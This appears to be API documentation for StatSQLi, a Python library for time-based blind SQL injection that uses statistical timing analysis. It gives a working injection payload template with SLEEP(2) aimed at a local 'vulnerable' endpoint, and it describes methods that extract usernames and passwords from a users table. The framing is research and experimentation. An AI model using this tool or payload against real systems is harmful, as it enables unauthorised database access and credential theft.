# Python API Guide

You can use StatSQLi directly as a Python library through `statsqli.main.StatSQLi`.

## Basic usage

```python
from statsqli.main import StatSQLi

tool = StatSQLi(
    url="http://127.0.0.1:5000/vulnerable?id=1",
    payload_template="' OR ({condition}) AND SLEEP(2) -- -",
    delay=None,            # Auto-detect if None
    parallel=False,
    max_workers=4
)

value = tool.extract_string_custom(
    table="users",
    column="username",
    where_clause="id=1 LIMIT 0,1",
    max_length=20
)

print(value)
```

## Main class methods

- `extract_string_custom(table, column, where_clause, max_length)`:
  extract one target string value.
- `extract_user_data(table="users", username_column="username", password_column="password", limit=5)`:
  iterate rows and extract paired fields.
- `extract_database_name()`:
  available in class, but relies on internal behavior and may require adaptation.

## Lower-level components

For custom experiments, instantiate modules directly:

- `TimingAnalyzer` for significance testing.
- `AdaptiveDelayDetector` for delay selection experiments.
- `BinarySearchExtractor` for per-character extraction control.
- `TraditionalExtractor` for baseline comparisons.
- `ParallelExtractor` for chunked parallel extraction.

## Integration tips

- Keep extraction logic in isolated test harnesses.
- Capture timing and query counts for reproducibility.
- Prefer explicit configuration in notebooks or scripts when comparing algorithms.
